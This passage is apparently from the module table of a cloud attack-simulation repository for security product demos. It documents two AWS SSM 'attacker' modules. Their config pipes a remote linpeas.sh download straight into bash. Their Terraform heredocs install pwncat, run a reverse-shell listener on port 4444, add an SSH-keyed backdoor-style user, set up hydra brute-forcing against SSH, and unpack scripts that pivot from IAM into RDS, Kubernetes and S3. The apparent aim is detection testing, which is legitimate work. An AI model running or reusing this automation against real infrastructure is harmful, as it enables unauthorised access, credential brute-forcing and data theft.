\}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| attacker-ssm-responder-reverse-shell-multistage                            | ./modules/ssm/responder-reverse-shell-multistage               | ssm_exec_reverse_shell_multistage_attacker | context.aws.ssm.attacker.responder.reverse_shell_multistage               | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "responder": {<br/>                        "reverse_shell_multistage": {<br/>                            "attack_delay": 50400,<br/>                            "enabled": false,<br/>                            "iam2rds_role_name": "rds_user_access_role_ciemdemo",<br/>                            "iam2rds_session_name": "attacker-session",<br/>                            "listen_ip": "0.0.0.0",<br/>                            "listen_port": 4444,<br/>                            "payload": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files",<br/>                            "reverse_shell_host": null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/responder-reverse-shell-multistage               | <pre>locals \{<br/>    listen\_port = var\.inputs\["listen\_port"\]<br/>    listen\_ip = var\.inputs\["listen\_ip"\]<br/>    attack\_dir = "/pwncat"<br/>    payload = <<\-EOT<br/>    PWNCAT\_LOG="/tmp/pwncat\.log"<br/>    PWNCAT\_SESSION="pwncat"<br/>    PWNCAT\_SESSION\_LOCK="/tmp/pwncat\_session\.lock"<br/>    if \[ \-e "$PWNCAT\_SESSION\_LOCK" \]  && screen \-ls \| grep \-q "$PWNCAT\_SESSION"; then<br/>        log "Pwncat session lock $PWNCAT\_SESSION\_LOCK exists and pwncat screen session running\. Skipping setup\."<br/>    else<br/>        rm \-f "$PWNCAT\_SESSION\_LOCK"<br/>        log "Session lock doesn't exist and screen session not runing\. Continuing\.\.\."<br/>        log "setting up reverse shell listener: $\{local\.listen\_ip\}:$\{local\.listen\_port\}"<br/>        screen \-S $PWNCAT\_SESSION \-X quit<br/>        screen \-wipe<br/>        log "cleaning app directory"<br/>        rm \-rf $\{local\.attack\_dir\}<br/>        mkdir \-p $\{local\.attack\_dir\}/plugins $\{local\.attack\_dir\}/resources<br/>        cd $\{local\.attack\_dir\}<br/>        echo $\{base64gzip\(local\.listener\)\} \| base64 \-d \| gunzip > listener\.py<br/>        echo $\{base64gzip\(local\.responder\)\} \| base64 \-d \| gunzip > plugins/responder\.py<br/>        echo $\{base64gzip\(local\.instance2rds\)\} \| base64 \-d \| gunzip > resources/instance2rds\.sh<br/>        echo $\{base64gzip\(local\.iam2rds\)\} \| base64 \-d \| gunzip > resources/iam2rds\.sh<br/>        echo $\{base64gzip\(local\.azureiam2azuresql\)\} \| base64 \-d \| gunzip > resources/azureiam2azuresql\.sh<br/>        echo $\{base64gzip\(local\.gcpiam2cloudsql\)\} \| base64 \-d \| gunzip > resources/gcpiam2cloudsql\.sh<br/>        echo $\{base64gzip\(local\.scan2kubeshell\)\} \| base64 \-d \| gunzip > resources/scan2kubeshell\.sh<br/>        echo $\{base64gzip\(local\.kube2s3\)\} \| base64 \-d \| gunzip > resources/kube2s3\.sh <br/>        echo $\{base64gzip\(local\.iam2enum\)\} \| base64 \-d \| gunzip > resources/iam2enum\.sh<br/>        log "installing required python3\.9\.\.\."<br/>        apt\-get install \-y python3\.9 python3\.9\-venv >> $LOGFILE 2>&1<br/>        curl https://bootstrap\.pypa\.io/get\-pip\.py \-o get\-pip\.py >> $LOGFILE 2>&1<br/>        python3\.9 get\-pip\.py >> $LOGFILE 2>&1<br/>        log "wait before using module\.\.\."<br/>        sleep 5<br/>        python3\.9 \-m pip install \-U pip setuptools wheel setuptools\_rust jinja2 jc >> $LOGFILE 2>&1<br/>        python3\.9 \-m pip install \-U pwncat\-cs >> $LOGFILE 2>&1<br/>        log "wait before using module\.\.\."<br/>        sleep 5<br/>        if \! \[ \-e /home/socksuser/\.ssh/socksuser\_key \]; then<br/>            log "adding tunneled port scanning user \- socksuser\.\.\."<br/>            adduser \-\-gecos "" \-\-disabled\-password "socksuser" \|\| log "socksuser user already exists"<br/>            log "adding ssh keys for socks user\.\.\."<br/>            mkdir \-p /home/socksuser/\.ssh 2>&1 \| tee \-a $LOGFILE<br/>            ssh\-keygen \-t rsa \-N '' \-b 4096 \-f /home/socksuser/\.ssh/socksuser\_key 2>&1 \| tee \-a $LOGFILE<br/>            cat /home/socksuser/\.ssh/socksuser\_key\.pub >> /home/socksuser/\.ssh/authorized\_keys 2>&1 \| tee \-a $LOGFILE<br/>            chown \-R socksuser:socksuser /home/socksuser<br/>            chmod 600 /home/socksuser/\.ssh/authorized\_keys 2>&1 \| tee \-a $LOGFILE<br/>            log "socksuser setup complete\.\.\."<br/>        fi<br/>        START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>        while true; do<br/>            for i in \`seq $\(\(MAXLOG\-1\)\) \-1 1\`; do mv "$PWNCAT\_LOG\."\{$i,$\(\(i\+1\)\)\} 2>/dev/null \|\| true; done<br/>            mv $PWNCAT\_LOG "$PWNCAT\_LOG\.1" 2>/dev/null \|\| true<br/>            log "starting background process via screen\.\.\."<br/>            screen \-S $PWNCAT\_SESSION \-X quit<br/>            screen \-wipe<br/>            screen \-d \-L \-Logfile $PWNCAT\_LOG \-S $PWNCAT\_SESSION \-m /bin/bash \-c "cd $\{local\.attack\_dir\} && python3\.9 listener\.py \-\-port=\\"$\{var\.inputs\["reverse\_shell\_port"\]\}\\" \-\-host=\\"$\{var\.inputs\["reverse\_shell\_host"\]\}\\" \-\-payload=\\"$\{var\.inputs\["payload"\]\}\\""<br/>            screen \-S $PWNCAT\_SESSION \-X colon "logfile flush 0^M"<br/>            log "Checking for listener\.\.\."<br/>            TIMEOUT=1800<br/>            START\_TIME=$\(date \+%s\)<br/>            while true; do<br/>                CURRENT\_TIME=$\(date \+%s\)<br/>                ELAPSED\_TIME=$\(\(CURRENT\_TIME \- START\_TIME\)\)<br/>                if grep "listener created" $PWNCAT\_LOG; then<br/>                    log "Found listener created log in $PWNCAT\_LOG \- checking for port response"<br/>                    while \! nc \-z \-w 5 \-vv 127\.0\.0\.1 $\{local\.listen\_port\} > /dev/null; do<br/>                        log "failed check \- waiting for pwncat port response: 127\.0\.0\.1:$\{local\.listen\_port\}";<br/>                        sleep 30;<br/>                        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>                            log "payload update detected \- exiting loop and forcing payload download"<br/>                            rm \-f /tmp/payload\_$SCRIPTNAME<br/>                            break 3<br/>                        fi<br/>                    done;<br/>                    log "Sucessfully connected to 127\.0\.0\.1:$\{local\.listen\_port\}"<br/>                    break<br/>                fi<br/>                if \[ $ELAPSED\_TIME \-gt $TIMEOUT \]; then<br/>                    log "Failed to find listener created log for pwncat \- timeout after $TIMEOUT seconds"<br/>                    exit 1<br/>                fi<br/>            done<br/>            log "responder started\."<br/>            log "starting sleep for 30 minutes \- blocking new tasks while accepting connections\.\.\."<br/>            sleep 1800<br/>            log "sleep complete \- checking for running sessions\.\.\."<br/>            while \[ \-e "$PWNCAT\_SESSION\_LOCK" \]  && screen \-ls \| grep \-q "$PWNCAT\_SESSION"; do<br/>                log "pwncat session still running \- waiting before restart\.\.\."<br/>                sleep 600<br/>            done<br/>            log "no pwncat sessions found \- continuing\.\.\."<br/>            if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>                log "payload update detected \- exiting loop and forcing payload download"<br/>                rm \-f /tmp/payload\_$SCRIPTNAME<br/>                break<br/>            else<br/>                log "restarting loop\.\.\."<br/>            fi<br/>        done<br/>    fi<br/>    log "done\."<br/>    EOT<br/><br/>    listener        = file\("$\{path\.module\}/resources/listener\.py"\)<br/>    responder       = file\("$\{path\.module\}/resources/responder\.py"\)<br/>    instance2rds    = templatefile\(<br/>                                "$\{path\.module\}/resources/instance2rds\.sh", <br/>                                \{<br/>                                    region = var\.inputs\["region"\],<br/>                                    environment = var\.inputs\["environment"\],<br/>                                    deployment = var\.inputs\["deployment"\]<br/>                                \}<br/>                            \)<br/><br/>    iam2rds         = templatefile\(<br/>                                "$\{path\.module\}/resources/iam2rds\.sh", <br/>                                \{<br/>                                    region = var\.inputs\["region"\],<br/>                                    environment = var\.inputs\["environment"\],<br/>                                    deployment = var\.inputs\["deployment"\],<br/>                                    iam2rds\_role\_name = var\.inputs\["iam2rds\_role\_name"\]<br/>                                    iam2rds\_session\_name = "$\{var\.inputs\["iam2rds\_session\_name"\]\}\-$\{var\.inputs\["deployment"\]\}"<br/>                                \}<br/>                            \)<br/>    <br/>    iam2enum = file\("$\{path\.module\}/resources/iam2enum\.sh"\)<br/>                            <br/>    azureiam2azuresql = file\("$\{path\.module\}/resources/azureiam2azuresql\.sh"\)                            <br/><br/>    gcpiam2cloudsql = file\("$\{path\.module\}/resources/gcpiam2cloudsql\.sh"\)<br/><br/>    scan2kubeshell = file\("$\{path\.module\}/resources/scan2kubeshell\.sh"\)<br/>    <br/>    kube2s3 = file\("$\{path\.module\}/resources/kube2s3\.sh"\)<br/><br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = ""<br/>        apt\_packages = "proxychains4 nmap hydra python3\-pip"<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  <<\-EOT<br/>        if \! command \-v proxychains4 > /dev/null \|\| \! command \-v hydra > /dev/null \|\| \! command \-v hydra > /dev/null; then<br/>            yum update \-y<br/>            yum install \-y git<br/>            yum groupinstall \-y 'Development Tools'<br/>            \# proxychains4<br/>            cd /usr/local/src<br/>            git clone https://github\.com/rofl0r/proxychains\-ng<br/>            cd proxychains\-ng<br/>            \./configure && make && make install<br/>            make install\-config<br/>            \# hydra<br/>            cd /usr/local/src<br/>            git clone https://github\.com/vanhauser\-thc/thc\-hydra<br/>            cd thc\-hydra<br/>            \./configure && make && make install<br/>        fi<br/>        EOT<br/>        yum\_packages = "nmap python3\-pip"<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_instance2rds\.sh"<br/>                content = base64encode\(local\.instance2rds\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_iam2rds\.sh"<br/>                content = base64encode\(local\.iam2rds\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_scan2kubeshell\.sh"<br/>                content = base64encode\(local\.scan2kubeshell\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_kube2s3\.sh"<br/>                content = base64encode\(local\.kube2s3\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_gcpiam2cloudsql\.sh"<br/>                content = base64encode\(local\.gcpiam2cloudsql\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_iam2enum\.sh"<br/>                content = base64encode\(local\.iam2enum\)<br/>            \}<br/>        \]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| attacker-ssm-connect-ssh-shell-multistage                                  | ./modules/ssm/connect-ssh-shell-multistage                     | ssm_connect_ssh_shell_multistage_attacker  | context.aws.ssm.attacker.connect.ssh_shell_multistage                     | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "connect": {<br/>                        "ssh_shell_multistage": {<br/>                            "attack_delay": 50400,<br/>                            "enabled": false,<br/>                            "password_list": "/tmp/hydra-passwords.txt",<br/>                            "payload": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files",<br/>                            "reverse_shell_host": null,<br/>                            "reverse_shell_port": 4444,<br/>                            "target_ip": null,<br/>                            "target_port": 22,<br/>                            "task": "custom",<br/>                            "user_list": "/tmp/hydra-users.txt"<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/connect-ssh-shell-multistage                     | <pre>locals \{<br/>    attack\_dir = "/pwncat\_connector"<br/>    payload = <<\-EOT<br/>    PWNCAT\_LOG="/tmp/pwncat\_connector\.log"<br/>    PWNCAT\_SESSION="pwncat\_connector"<br/>    PWNCAT\_SESSION\_LOCK="/tmp/pwncat\_connector\_session\.lock"<br/>    if \[ \-e "$PWNCAT\_SESSION\_LOCK" \]  && screen \-ls \| grep \-q "$PWNCAT\_SESSION"; then<br/>        log "Pwncat session lock $PWNCAT\_SESSION\_LOCK exists and $PWNCAT\_SESSION screen session running\. Skipping setup\."<br/>    else<br/>        rm \-f "$PWNCAT\_SESSION\_LOCK"<br/>        log "Session lock doesn't exist and screen session not runing\. Continuing\.\.\."<br/>        screen \-S $PWNCAT\_SESSION \-X quit<br/>        screen \-wipe<br/>        log "cleaning app directory"<br/>        rm \-rf $\{local\.attack\_dir\}<br/>        mkdir \-p $\{local\.attack\_dir\}/plugins $\{local\.attack\_dir\}/resources<br/>        cd $\{local\.attack\_dir\}<br/>        echo $\{base64gzip\(local\.connector\)\} \| base64 \-d \| gunzip > connector\.py<br/>        echo $\{base64gzip\(local\.scan\)\} \| base64 \-d \| gunzip > scan\.sh<br/>        log "installing required python3\.9\.\.\."<br/>        apt\-get install \-y python3\.9 python3\.9\-venv >> $LOGFILE 2>&1<br/>        curl https://bootstrap\.pypa\.io/get\-pip\.py \-o get\-pip\.py >> $LOGFILE 2>&1<br/>        python3\.9 get\-pip\.py >> $LOGFILE 2>&1<br/>        log "wait before using module\.\.\."<br/>        sleep 5<br/>        python3\.9 \-m pip install \-U pip setuptools wheel setuptools\_rust jinja2 jc >> $LOGFILE 2>&1<br/>        python3\.9 \-m pip install \-U pwncat\-cs >> $LOGFILE 2>&1<br/>        log "wait before using module\.\.\."<br/>        sleep 5<br/>        log "checking for user and password list before starting\.\.\."<br/>        while \! \[ \-f "$\{var\.inputs\["user\_list"\]\}" \] \|\| \! \[ \-f "$\{var\.inputs\["password\_list"\]\}" \]; do<br/>            log "waiting for $\{var\.inputs\["user\_list"\]\} and $\{var\.inputs\["password\_list"\]\}\.\.\."<br/>            sleep 30<br/>        done<br/>        START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>        while true; do<br/>            for i in \`seq $\(\(MAXLOG\-1\)\) \-1 1\`; do mv "$PWNCAT\_LOG\."\{$i,$\(\(i\+1\)\)\} 2>/dev/null \|\| true; done<br/>            mv $PWNCAT\_LOG "$PWNCAT\_LOG\.1" 2>/dev/null \|\| true<br/>            log "starting background process via screen\.\.\."<br/>            screen \-S $PWNCAT\_SESSION \-X quit<br/>            screen \-wipe<br/>            screen \-d \-L \-Logfile $PWNCAT\_LOG \-S $PWNCAT\_SESSION \-m /bin/bash \-c "cd $\{local\.attack\_dir\} && python3\.9 connector\.py \-\-target\-ip=\\"$\{var\.inputs\["target\_ip"\]\}\\" \-\-target\-port=\\"$\{var\.inputs\["target\_port"\]\}\\" \-\-user\-list=\\"$\{var\.inputs\["user\_list"\]\}\\" \-\-password\-list=\\"$\{var\.inputs\["password\_list"\]\}\\" \-\-task=\\"$\{var\.inputs\["task"\]\}\\" \-\-payload=\\"$\{base64encode\(var\.inputs\["payload"\]\)\}\\" \-\-reverse\-shell\-host=\\"$\{var\.inputs\["reverse\_shell\_host"\]\}\\"  \-\-reverse\-shell\-port=\\"$\{var\.inputs\["reverse\_shell\_port"\]\}\\""<br/>            screen \-S $PWNCAT\_SESSION \-X colon "logfile flush 0^M"<br/>            log "connector started\."<br/>            log "starting sleep for 30 minutes \- blocking new tasks while accepting connections\.\.\."<br/>            sleep 1800<br/>            log "sleep complete \- checking for running sessions\.\.\."<br/>            while \[ \-e "$PWNCAT\_SESSION\_LOCK" \]  && screen \-ls \| grep \-q "$PWNCAT\_SESSION"; do<br/>                log "pwncat session still running \- waiting before restart\.\.\."<br/>                sleep 600<br/>            done<br/>            log "no pwncat sessions found \- continuing\.\.\."<br/>            if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>                log "payload update detected \- exiting loop and forcing payload download"<br/>                rm \-f /tmp/payload\_$SCRIPTNAME<br/>                break<br/>            else<br/>                log "restarting loop\.\.\."<br/>            fi<br/>        done<br/>    fi<br/>    log "done\."<br/>    EOT<br/><br/>    connector        = file\(<br/>                                "$\{path\.module\}/resources/connector\.py", <br/>                            \)<br/>    <br/>    scan            = file\(<br/>                                "$\{path\.module\}/resources/scan\.sh", <br/>                            \)<br/>    <br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = ""<br/>        apt\_packages = "proxychains4 nmap hydra python3\-pip"<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  <<\-EOT<br/>        if \! command \-v proxychains4 > /dev/null \|\| \! command \-v hydra > /dev/null \|\| \! command \-v hydra > /dev/null; then<br/>            yum update \-y<br/>            yum install \-y git<br/>            yum groupinstall \-y 'Development Tools'<br/>            \# proxychains4<br/>            cd /usr/local/src<br/>            git clone https://github\.com/rofl0r/proxychains\-ng<br/>            cd proxychains\-ng<br/>            \./configure && make && make install<br/>            make install\-config<br/>            \# hydra<br/>            cd /usr/local/src<br/>            git clone https://github\.com/vanhauser\-thc/thc\-hydra<br/>            cd thc\-hydra<br/>            \./configure && make && make install<br/>        fi<br/>        EOT<br/>        yum\_packages = "nmap python3\-pip"<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = var\.inputs\["attack\_delay"\]<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_scan\.sh"<br/>                content = base64encode\(local\.scan\)<br/>            \},<br/>        \]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |